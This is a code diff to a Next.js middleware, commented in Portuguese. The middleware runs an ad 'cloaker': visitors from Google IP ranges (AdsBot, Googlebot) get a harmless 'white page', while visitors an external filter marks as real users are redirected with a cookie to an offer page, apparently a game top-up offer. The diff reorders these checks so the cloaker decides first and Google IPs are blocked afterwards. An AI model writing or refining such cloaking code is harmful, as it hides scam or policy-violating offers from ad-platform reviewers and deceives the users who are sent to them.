@@ -187,32 +187,10 @@ export async function middleware(request: NextRequest) {
   // ===== APENAS ROTA / (raiz) chega aqui =====
   // Cookie já foi verificado no início - se chegou aqui, não tem cookie
 
-  // 🛡️ FILTRO DE REFERER: Verificar se vem do Google (APENAS para rota /)
-  const referer = request.headers.get('referer') || ''
-  const isFromGoogle = referer === 'https://www.google.com/'
+  // 🚀 DEIXAR O CLOAKER DECIDIR TUDO!
+  // Não vamos filtrar NADA antes - o cloaker é quem manda
   
-  // Se NÃO vem do Google = BOT!
-  if (!isFromGoogle) {
-    return NextResponse.next() // Mostrar white page sem chamar _x9f2w8k5
-  }
-
-  // 🚀 VERIFICAR IP DO GOOGLE: Bloquear AdsBot que simula usuário real
   const clientIp = request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || request.ip || 'unknown'
-  
-  // Verificar se é IP do Google (AdsBot, Googlebot, etc)
-  const isGoogleIP = clientIp.startsWith('2001:4860:') || // IPv6 Google
-                     clientIp.startsWith('66.249.') ||    // Googlebot IPv4
-                     clientIp.startsWith('66.102.') ||    // Google IPv4
-                     clientIp.startsWith('64.233.') ||    // Google IPv4
-                     clientIp.startsWith('72.14.') ||     // Google IPv4
-                     clientIp.startsWith('209.85.') ||    // Google IPv4
-                     clientIp.startsWith('216.239.')      // Google IPv4
-  
-  if (isGoogleIP) {
-    return NextResponse.next() // Mostrar white page sem chamar _x9f2w8k5
-  }
-
-  // 🚀 CACHE: Verificar se já verificamos este usuário recentemente
   const userAgent = request.headers.get('user-agent') || ''
   const cacheKey = `${clientIp}-${userAgent.substring(0, 50)}` // Limitar tamanho
   
@@ -292,6 +270,23 @@ export async function middleware(request: NextRequest) {
       }
     }
 
+    // ✅ CLOAKER DECIDIU: Agora vamos verificar se é IP do Google
+    // Se o cloaker liberou (black) mas é IP do Google, bloqueamos
+    if (result.type === 'black') {
+      const isGoogleIP = clientIp.startsWith('2001:4860:') || // IPv6 Google
+                         clientIp.startsWith('66.249.') ||    // Googlebot IPv4
+                         clientIp.startsWith('66.102.') ||    // Google IPv4
+                         clientIp.startsWith('64.233.') ||    // Google IPv4
+                         clientIp.startsWith('72.14.') ||     // Google IPv4
+                         clientIp.startsWith('209.85.') ||    // Google IPv4
+                         clientIp.startsWith('216.239.')      // Google IPv4
+      
+      if (isGoogleIP) {
+        // Cloaker liberou, mas é IP do Google - BLOQUEAR!
+        return NextResponse.next() // Mostrar white page
+      }
+    }
+
     // Salvar no cache
     filterCache.set(cacheKey, {
       type: result.type,
@@ -310,7 +305,7 @@ export async function middleware(request: NextRequest) {
       return NextResponse.next()
     }
 
-    // Se for "black" (usuário real), REDIRECIONAR para /recargajogo com cookie
+    // Se for "black" (usuário real) E não é IP do Google, REDIRECIONAR para /recargajogo com cookie
     // Criar URL sem barra final
     const redirectUrl = new URL(FILTER_CONFIG.offerPagePath, request.url)
     // Manter query params (gclid, utm, etc)
